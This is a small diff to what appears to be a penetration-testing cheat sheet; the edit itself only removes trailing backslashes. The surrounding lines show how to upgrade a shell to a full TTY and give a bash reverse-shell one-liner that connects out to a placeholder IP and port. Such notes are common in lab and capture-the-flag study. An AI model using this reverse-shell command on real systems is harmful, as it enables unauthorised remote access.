@@ -18,7 +18,7 @@ $ python -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-Z\
 **In Kali**
 $ stty raw -echo
-$ fg\
+$ fg
 
 **In reverse shell**
 $ reset
@@ -29,7 +29,7 @@ $ stty rows <num> columns <cols>
 # THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
 **THIS IS USED FOR REVERSE CONNECTIONS.\
 IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"\
-YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**\
+YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**
 # BASH
 bash -i >& /dev/tcp/IP/PORT 0>&1
 
